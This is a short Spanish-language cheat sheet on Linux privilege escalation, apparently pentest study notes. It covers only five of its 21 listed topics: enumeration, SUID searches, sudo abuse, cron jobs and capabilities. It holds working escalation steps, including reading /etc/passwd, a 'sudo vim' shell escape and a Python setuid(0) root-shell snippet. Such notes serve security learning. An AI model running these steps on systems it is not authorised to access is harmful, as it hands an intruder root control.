## Content:
- Enumeration
- SUID
- Sudo Permissions
- Cron Jobs
- Capabilities
- Weak Permissions
- SSH
- Kernel Exploits
- NFS
- Docker / LXC
- Environment Variables
- PATH Hijacking
- Wildcards Abuse
- Credential Hunting
- Sensitive Files
- Log Files
- Services
- Scripts Analysis
- Password Reuse
- Tools
- References

1. Enumeration 

Antes de explotar nada:
- whoami
- id
- hostname
- uname -a
- cat /etc/os-release

Usuarios:
- cat /etc/passwd
- cat /etc/group
- last
- w

Procesos:
- ps aux
- ps aux | grep root

Red:
 - ip a
- netstat -tulpn
- ss -tulpn

2. SUID

Buscar SUID:

- find / -perm -4000 -type f 2>/dev/null

Buscar binarios vulnerables:

- find / -perm -u=s -type f 2>/dev/null

Ejemplos:
/usr/bin/python
/usr/bin/vim
/usr/bin/nmap
/usr/bin/find

3. Sudo Permissions
- sudo -l

Buscar:
- NOPASSWD
- comandos permitidos
- versiones vulnerables

Ejemplo:
- sudo vim

Escalada:
- :!bash

4. Cron Jobs

Buscar tareas:
- cat /etc/crontab
- ls -la /etc/cron*

Buscar scripts:
- find / -name "*.sh" 2>/dev/null

Puntos a revisar:
- scripts ejecutados como root
- permisos de escritura
- PATH inseguro

5. Linux Capabilities

Buscar:
- getcap -r / 2>/dev/null

Ejemplo:
- /usr/bin/python3 cap_setuid+ep

Puede permitir:
import os
os.setuid(0)
os.system("/bin/bash")
